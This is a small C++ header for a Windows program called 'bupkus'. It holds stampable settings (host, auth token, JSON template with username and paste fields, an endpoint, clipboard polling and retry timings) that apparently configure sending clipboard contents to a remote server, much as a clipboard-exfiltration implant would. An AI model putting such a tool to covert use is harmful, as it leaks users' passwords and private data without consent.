#ifndef _BUPKUS_H_
#define _BUPKUS_H_

#include <Windows.h>
#include <stdint.h>


// stampable values - configured via web interface or helper script
constexpr wchar_t c_Hostname[128] = L"EVERYBODYGETUP";
constexpr wchar_t c_AuthToken[] = L"00000000-0000-0000-0000-000000000000";

constexpr char c_JsonTemplate[] =
"{\n"
"    \"auth_token\": \"%S\",\n"
"    \"username\": \"%s\",\n"
"    \"paste\": \"%s\"\n"
"}";
constexpr wchar_t c_Endpoint[] = L"bupkus/paste/";
constexpr wchar_t c_ContentType[] = L"Content-Type: application/json; charset=ascii\r\n";

constexpr uint64_t c_PasteCooldownTime = 1000;  // 1 second cooldown

constexpr uint32_t c_ClipboardAttempts = 10;
constexpr uint32_t c_ClipboardInterval = 10;  // 10ms
constexpr uint32_t c_ClipboardBackoff = 2;    // double the interval every failure

constexpr uint32_t c_ConnectAttempts = 5;
constexpr uint32_t c_ConnectInterval = 30 * 1000;  // 30 seconds, in milliseconds

#endif  // _BUPKUS_H_